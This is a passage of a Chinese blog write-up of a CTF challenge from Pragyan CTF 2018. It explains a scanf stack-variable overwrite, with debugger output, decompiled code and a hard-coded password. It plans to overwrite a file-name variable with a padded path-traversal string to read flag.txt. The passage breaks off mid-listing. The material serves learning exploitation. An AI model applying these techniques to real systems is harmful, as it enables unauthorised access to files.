@@ -1,0 +1,1388 @@
+<!DOCTYPE html>
+
+
+
+  
+
+
+<html class="theme-next gemini use-motion" lang="zh-Hans">
+<head>
+  <meta charset="UTF-8"/>
+<meta http-equiv="X-UA-Compatible" content="IE=edge" />
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"/>
+<meta name="theme-color" content="#222">
+
+
+
+
+
+
+
+
+
+<meta http-equiv="Cache-Control" content="no-transform" />
+<meta http-equiv="Cache-Control" content="no-siteapp" />
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+  <link href="/lib/fancybox/source/jquery.fancybox.css?v=2.1.5" rel="stylesheet" type="text/css" />
+
+
+
+
+
+
+
+<link href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css" />
+
+<link href="/css/main.css?v=5.1.4" rel="stylesheet" type="text/css" />
+
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png?v=5.1.4">
+
+
+  <link rel="mask-icon" href="/images/logo.svg?v=5.1.4" color="#222">
+
+
+
+
+
+  <meta name="keywords" content="格式化字符串," />
+
+
+
+
+  
+
+
+  <link rel="alternate" href="/atom.xml" title="Sakuraのblog" type="application/atom+xml" />
+
+
+
+
+
+
+<meta name="description" content="Old school hack (200pts)题目题目描述1234567Chris is trying out to be a police officer and the applications have just been sent into the police academy.He is really eager to find out about his competition. H">
+<meta property="og:type" content="article">
+<meta property="og:title" content="pragyan ctf2018 pwn writeup">
+<meta property="og:url" content="http://eternalsakura13.com/2018/03/05/pragyan/index.html">
+<meta property="og:site_name" content="Sakuraのblog">
+<meta property="og:description" content="Old school hack (200pts)题目题目描述1234567Chris is trying out to be a police officer and the applications have just been sent into the police academy.He is really eager to find out about his competition. H">
+<meta property="og:image" content="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-03-05-131332.png">
+<meta property="og:image" content="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-03-05-142756.jpg">
+<meta property="og:image" content="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-03-05-142805.jpg">
+<meta property="og:image" content="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-03-05-142854.jpg">
+<meta property="og:image" content="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-03-05-142934.jpg">
+<meta property="og:image" content="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-03-06-033250.png">
+<meta property="og:image" content="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-03-06-033601.png">
+<meta property="og:image" content="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-03-06-041310.png">
+<meta property="og:image" content="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-03-06-155208.png">
+<meta property="og:image" content="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-03-06-160953.png">
+<meta property="og:image" content="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-03-06-161430.png">
+<meta property="og:image" content="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-03-06-164412.png">
+<meta property="og:image" content="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-03-06-164523.png">
+<meta property="og:image" content="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-03-06-164623.png">
+<meta property="og:image" content="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-03-06-164825.png">
+<meta property="article:published_time" content="2018-03-05T12:09:56.719Z">
+<meta property="article:modified_time" content="2018-10-22T14:25:51.728Z">
+<meta property="article:author" content="sakura">
+<meta property="article:tag" content="格式化字符串">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-03-05-131332.png">
+
+
+
+<script type="text/javascript" id="hexo.configurations">
+  var NexT = window.NexT || {};
+  var CONFIG = {
+    root: '/',
+    scheme: 'Gemini',
+    version: '5.1.4',
+    sidebar: {"position":"left","display":"post","offset":12,"b2t":false,"scrollpercent":false,"onmobile":false},
+    fancybox: true,
+    tabs: true,
+    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
+    duoshuo: {
+      userId: '0',
+      author: '博主'
+    },
+    algolia: {
+      applicationID: 'QOPH9ID41Z',
+      apiKey: '',
+      indexName: 'sakura',
+      hits: {"per_page":10},
+      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
+    }
+  };
+</script>
+
+
+
+  <link rel="canonical" href="http://eternalsakura13.com/2018/03/05/pragyan/"/>
+
+
+
+
+
+  <title>pragyan ctf2018 pwn writeup | Sakuraのblog</title>
+  
+
+
+
+
+<script>
+  (function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){
+            (i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
+          m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
+  })(window,document,'script','https://www.google-analytics.com/analytics.js','ga');
+  ga('create', 'UA-113420358-1', 'auto');
+  ga('send', 'pageview');
+</script>
+
+
+
+
+
+<meta name="generator" content="Hexo 4.2.1"></head>
+
+<body itemscope itemtype="http://schema.org/WebPage" lang="zh-Hans">
+
+  
+  
+    
+  
+
+  <div class="container sidebar-position-left page-post-detail">
+    <div class="headband"></div>
+
+    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-wrapper">
+  <div class="site-meta ">
+    
+
+    <div class="custom-logo-site-title">
+      <a href="/"  class="brand" rel="start">
+        <span class="logo-line-before"><i></i></span>
+        <span class="site-title">Sakuraのblog</span>
+        <span class="logo-line-after"><i></i></span>
+      </a>
+    </div>
+      
+        <p class="site-subtitle"></p>
+      
+  </div>
+
+  <div class="site-nav-toggle">
+    <button>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+    </button>
+  </div>
+</div>
+
+<nav class="site-nav">
+  
+
+  
+    <ul id="menu" class="menu">
+      
+        
+        <li class="menu-item menu-item-home">
+          <a href="/%20" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-home"></i> <br />
+            
+            首页
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-about">
+          <a href="/about/%20" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-user"></i> <br />
+            
+            关于
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-tags">
+          <a href="/tags/%20" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-tags"></i> <br />
+            
+            标签
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-categories">
+          <a href="/categories/%20" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-th"></i> <br />
+            
+            分类
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-archives">
+          <a href="/archives/%20" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-archive"></i> <br />
+            
+            归档
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-buglist">
+          <a href="/buglist/%20" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-sitemap"></i> <br />
+            
+            BugList
+          </a>
+        </li>
+      
+
+      
+        <li class="menu-item menu-item-search">
+          
+            <a href="javascript:;" class="popup-trigger">
+          
+            
+              <i class="menu-item-icon fa fa-search fa-fw"></i> <br />
+            
+            搜索
+          </a>
+        </li>
+      
+    </ul>
+  
+
+  
+    <div class="site-search">
+      
+  <div class="popup search-popup local-search-popup">
+  <div class="local-search-header clearfix">
+    <span class="search-icon">
+      <i class="fa fa-search"></i>
+    </span>
+    <span class="popup-btn-close">
+      <i class="fa fa-times-circle"></i>
+    </span>
+    <div class="local-search-input-wrapper">
+      <input autocomplete="off"
+             placeholder="搜索..." spellcheck="false"
+             type="text" id="local-search-input">
+    </div>
+  </div>
+  <div id="local-search-result"></div>
+</div>
+
+
+
+    </div>
+  
+</nav>
+
+
+
+ </div>
+    </header>
+
+    <main id="main" class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          <div id="content" class="content">
+            
+
+  <div id="posts" class="posts-expand">
+    
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="http://eternalsakura13.com/2018/03/05/pragyan/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="sakura">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="/images/sakura_heart.png">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Sakuraのblog">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">pragyan ctf2018 pwn writeup</h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2018-03-05T20:09:56+08:00">
+                2018-03-05
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+            <span class="post-category" >
+            
+              <span class="post-meta-divider">|</span>
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">分类于</span>
+              
+              
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/CTF/" itemprop="url" rel="index">
+                    <span itemprop="name">CTF</span>
+                  </a>
+                </span>
+
+                
+                
+                  ， 
+                
+              
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/CTF/pwn/" itemprop="url" rel="index">
+                    <span itemprop="name">pwn</span>
+                  </a>
+                </span>
+
+                
+                
+                  ， 
+                
+              
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/CTF/pwn/%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2/" itemprop="url" rel="index">
+                    <span itemprop="name">格式化字符串</span>
+                  </a>
+                </span>
+
+                
+                
+              
+            </span>
+          
+
+          
+            
+              <span class="post-comments-count">
+                <span class="post-meta-divider">|</span>
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-comment-o"></i>
+                </span>
+                <a href="/2018/03/05/pragyan/#comments" itemprop="discussionUrl">
+                  <span class="post-comments-count disqus-comment-count"
+                        data-disqus-identifier="2018/03/05/pragyan/" itemprop="commentCount"></span>
+                </a>
+              </span>
+            
+          
+
+          
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        <h1 id="Old-school-hack-200pts"><a href="#Old-school-hack-200pts" class="headerlink" title="Old school hack (200pts)"></a>Old school hack (200pts)</h1><h2 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h2><h3 id="题目描述"><a href="#题目描述" class="headerlink" title="题目描述"></a>题目描述</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">Chris is trying out to be a police officer and the applications have just been sent into the police academy.</span><br><span class="line">He is really eager to find out about his competition. </span><br><span class="line">Help it him back the system and view the other applicant’s applications.</span><br><span class="line"></span><br><span class="line">The service is running at 128.199.224.175:13000</span><br><span class="line"></span><br><span class="line">Hint! Path Traversals are always a classic.</span><br></pre></td></tr></table></figure>
+<h3 id="题目链接："><a href="#题目链接：" class="headerlink" title="题目链接："></a>题目链接：</h3><p><a href="https://github.com/eternalsakura/ctf_pwn/blob/master/pragyan2018/police_academy" target="_blank" rel="noopener">https://github.com/eternalsakura/ctf_pwn/blob/master/pragyan2018/police_academy</a></p>
+<h2 id="前置知识"><a href="#前置知识" class="headerlink" title="前置知识"></a>前置知识</h2><h3 id="scanf变量覆盖"><a href="#scanf变量覆盖" class="headerlink" title="scanf变量覆盖"></a>scanf变量覆盖</h3><p>程序举例</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">void</span>)</span></span>&#123;</span><br><span class="line">    <span class="keyword">char</span> a,b;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"input character a,b\n"</span>);</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">"%s"</span>,&amp;a);<span class="comment">//bug</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"%c%c\n"</span>,a,b);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>输出结果</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">AA</span><br></pre></td></tr></table></figure>
+<p><strong>简单调试</strong><br>编译程序</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gcc test.c -g -o test</span><br></pre></td></tr></table></figure>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">sakura@ubuntu:~$ gdb test</span><br><span class="line">Loaded 112 commands. Type pwndbg [filter] for a list.</span><br><span class="line">Reading symbols from test...done.</span><br><span class="line">pwndbg&gt; b 5</span><br><span class="line">Breakpoint 1 at 0x4005ff: file test.c, line 5.</span><br><span class="line">pwndbg&gt; r</span><br><span class="line">Starting program: &#x2F;home&#x2F;sakura&#x2F;test </span><br><span class="line">input character a,b</span><br><span class="line">...</span><br><span class="line">pwndbg&gt; n</span><br><span class="line">AAAA</span><br><span class="line">6	    printf(&quot;%c%c\n&quot;,a,b);</span><br><span class="line">...</span><br><span class="line">pwndbg&gt; p a</span><br><span class="line">$1 &#x3D; 65 &#39;A&#39;</span><br><span class="line">pwndbg&gt; p b</span><br><span class="line">$2 &#x3D; 65 &#39;A&#39;</span><br><span class="line">pwndbg&gt; c</span><br><span class="line">Continuing.</span><br><span class="line">AA</span><br></pre></td></tr></table></figure>
+<p>可以看出函数里本来应该只对a赋值。</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">scanf</span>(<span class="string">"%s"</span>,&amp;a)</span><br></pre></td></tr></table></figure>
+<p>但是b的值也被覆盖为A了，这里其实就可以栈溢出，但是在本题中只需要覆盖栈内变量即可。</p>
+<h2 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h2><h3 id="checksec"><a href="#checksec" class="headerlink" title="checksec"></a>checksec</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">sakura@ubuntu:~$ checksec police_academy </span><br><span class="line">[*] &#39;&#x2F;home&#x2F;sakura&#x2F;police_academy&#39;</span><br><span class="line">    Arch:     amd64-64-little</span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    Canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      No PIE (0x400000)</span><br><span class="line">sakura@ubuntu:~$</span><br></pre></td></tr></table></figure>
+<p>64位程序,canary,NX保护</p>
+<h3 id="输入密码"><a href="#输入密码" class="headerlink" title="输入密码"></a>输入密码</h3><p>密码被硬编码进程序,即kaiokenx20</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> ( <span class="built_in">strncmp</span>(&amp;s1, <span class="string">"kaiokenx20"</span>, <span class="number">10u</span>LL) )</span><br></pre></td></tr></table></figure>
+<h3 id="栈溢出"><a href="#栈溢出" class="headerlink" title="栈溢出"></a>栈溢出</h3><p><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-03-05-131332.png" alt=""></p>
+<h3 id="文件读取函数"><a href="#文件读取函数" class="headerlink" title="文件读取函数"></a>文件读取函数</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"> __int64 v8; <span class="comment">// [rsp+20h] [rbp-30h]</span></span><br><span class="line"> ...</span><br><span class="line"> v6 = print_record((<span class="keyword">const</span> <span class="keyword">char</span> *)&amp;v8);</span><br><span class="line"></span><br><span class="line"> <span class="function"><span class="keyword">signed</span> __int64 __fastcall <span class="title">print_record</span><span class="params">(<span class="keyword">const</span> <span class="keyword">char</span> *a1)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  FILE *stream; <span class="comment">// [rsp+18h] [rbp-338h]</span></span><br><span class="line">  <span class="keyword">char</span> ptr; <span class="comment">// [rsp+20h] [rbp-330h]</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int64 v4; <span class="comment">// [rsp+348h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v4 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  <span class="keyword">if</span> ( (<span class="keyword">unsigned</span> <span class="keyword">int</span>)<span class="built_in">strlen</span>(a1) != <span class="number">36</span> )         <span class="comment">// 文件名要等于36字节</span></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0xFFFFFFFF</span>LL;</span><br><span class="line">  stream = fopen(a1, <span class="string">"r"</span>);</span><br><span class="line">  <span class="keyword">if</span> ( !stream )</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0xFFFFFFFF</span>LL;</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"\nXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX"</span>, <span class="string">"r"</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"\nXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX\n"</span>);</span><br><span class="line">  fread(&amp;ptr, <span class="number">0x30C</span>uLL, <span class="number">1u</span>LL, stream);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"%s"</span>, &amp;ptr);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"\n\nXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX"</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"\nXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX"</span>);</span><br><span class="line">  fclose(stream);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0L</span>L;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>这个函数的作用就是根据文件名读取文件，这个文件名本来是根据我们的选项(1-7)来决定的，比如如果是7，则v8 = ‘txt.galf’。<br>但是可以看出，如果我们输入的数在1-7之外，那么就不会对v8赋值，如果我们通过前面的scanf直接把v8的值覆盖成我们想要读取的文件名(flag.txt)，那么就可以读取到flag了。</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br></pre></td><td class="code"><pre><span class="line">__isoc99_scanf(<span class="string">"%d"</span>, &amp;v5);</span><br><span class="line">  <span class="keyword">switch</span> ( v5 )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">1</span>:</span><br><span class="line">      v8 = <span class="number">3474298655558951218L</span>L;</span><br><span class="line">      v9 = <span class="number">3847821640488804656L</span>L;</span><br><span class="line">      v10 = <span class="number">7149858464072819505L</span>L;</span><br><span class="line">      v11 = <span class="number">7221017546570621237L</span>L;</span><br><span class="line">      v12 = <span class="number">1952539694</span>;</span><br><span class="line">      v13 = <span class="number">0</span>;</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">2</span>:</span><br><span class="line">      v8 = <span class="number">7147605565415700579L</span>L;</span><br><span class="line">      v9 = <span class="number">3631416849257871156L</span>L;</span><br><span class="line">      v10 = <span class="number">4121973650644951905L</span>L;</span><br><span class="line">      v3 = (<span class="keyword">int</span> *)<span class="number">4049125503535429937L</span>L;</span><br><span class="line">      v11 = <span class="number">4049125503535429937L</span>L;</span><br><span class="line">      v12 = <span class="number">1952539694</span>;</span><br><span class="line">      v13 = <span class="number">0</span>;</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">3</span>:</span><br><span class="line">      v8 = <span class="number">0x3233613163393238</span>LL;</span><br><span class="line">      v9 = <span class="number">3702634411308757558L</span>L;</span><br><span class="line">      v3 = (<span class="keyword">int</span> *)<span class="number">7076898166606619443L</span>L;</span><br><span class="line">      v10 = <span class="number">7076898166606619443L</span>L;</span><br><span class="line">      v11 = <span class="number">7219893850032333154L</span>L;</span><br><span class="line">      v12 = <span class="number">1952539694</span>;</span><br><span class="line">      v13 = <span class="number">0</span>;</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">4</span>:</span><br><span class="line">      v8 = <span class="number">7221577417837786465L</span>L;</span><br><span class="line">      v3 = (<span class="keyword">int</span> *)<span class="number">7363447393777498210L</span>L;</span><br><span class="line">      v9 = <span class="number">7363447393777498210L</span>L;</span><br><span class="line">      v10 = <span class="number">7017788206782754871L</span>L;</span><br><span class="line">      v11 = '06491899';</span><br><span class="line">      v12 = 'tad.';</span><br><span class="line">      v13 = <span class="number">0</span>;</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">5</span>:</span><br><span class="line">      v8 = 'cb7eb354';</span><br><span class="line">      v9 = <span class="number">7147275711155430960L</span>L;</span><br><span class="line">      v10 = <span class="number">7076672766706148656L</span>L;</span><br><span class="line">      v3 = (<span class="keyword">int</span> *)<span class="number">3486685753473249589L</span>L;</span><br><span class="line">      v11 = <span class="number">3486685753473249589L</span>L;</span><br><span class="line">      v12 = <span class="number">1952539694</span>;</span><br><span class="line">      v13 = <span class="number">0</span>;</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">6</span>:</span><br><span class="line">      v8 = <span class="number">0331433146246314630463L</span>L;</span><br><span class="line">      v9 = 'b5d57a29';</span><br><span class="line">      v3 = (int *)'a7e6a65d';</span><br><span class="line">      v10 = 'a7e6a65d';</span><br><span class="line">      v11 = 'c721627f';</span><br><span class="line">      v12 = 'tad.';</span><br><span class="line">      v13 = <span class="number">0</span>;</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">7</span>:</span><br><span class="line">      v8 = 'txt.galf';</span><br><span class="line">      LOBYTE(v9) = <span class="number">0</span>;</span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">"You don't have the required privileges to view the flag, yet."</span>);</span><br><span class="line">      <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">      <span class="keyword">return</span> result;</span><br><span class="line">    <span class="keyword">default</span>:</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure>
+<h3 id="长度校验"><a href="#长度校验" class="headerlink" title="长度校验"></a>长度校验</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> ( (<span class="keyword">unsigned</span> <span class="keyword">int</span>)<span class="built_in">strlen</span>(a1) != <span class="number">36</span> ) </span><br><span class="line">    <span class="keyword">return</span> <span class="number">0xFFFFFFFF</span>LL;</span><br></pre></td></tr></table></figure>
+<p>因为我们提供的v8的文件名要等于36字节，但是flag.txt没有那么长，所以这里，我们可以<strong>用./././..来填充。</strong></p>
+<h2 id="利用"><a href="#利用" class="headerlink" title="利用"></a>利用</h2><h3 id="利用思路"><a href="#利用思路" class="headerlink" title="利用思路"></a>利用思路</h3><p>首先用scanf覆盖是s1的值为密码（kaiokenx20）+padding,覆盖v8的值为././././././././././././././flag.txt，然后读取flag。</p>
+<h3 id="确定填充值"><a href="#确定填充值" class="headerlink" title="确定填充值"></a>确定填充值</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line">char s1; &#x2F;&#x2F; [rsp+10h] [rbp-40h]</span><br><span class="line">__int64 v8; &#x2F;&#x2F; [rsp+20h] [rbp-30h]</span><br><span class="line">...</span><br><span class="line">...</span><br><span class="line">...</span><br><span class="line"> __isoc99_scanf(&quot;%s&quot;, &amp;s1);</span><br><span class="line"> ...</span><br><span class="line"> ...</span><br><span class="line"> ...</span><br><span class="line">-0000000000000040 s1              db ?</span><br><span class="line">-000000000000003F                 db ? ; undefined</span><br><span class="line">-000000000000003E                 db ? ; undefined</span><br><span class="line">-000000000000003D                 db ? ; undefined</span><br><span class="line">-000000000000003C                 db ? ; undefined</span><br><span class="line">-000000000000003B                 db ? ; undefined</span><br><span class="line">-000000000000003A                 db ? ; undefined</span><br><span class="line">-0000000000000039                 db ? ; undefined</span><br><span class="line">-0000000000000038                 db ? ; undefined</span><br><span class="line">-0000000000000037                 db ? ; undefined</span><br><span class="line">-0000000000000036                 db ? ; undefined</span><br><span class="line">-0000000000000035                 db ? ; undefined</span><br><span class="line">-0000000000000034                 db ? ; undefined</span><br><span class="line">-0000000000000033                 db ? ; undefined</span><br><span 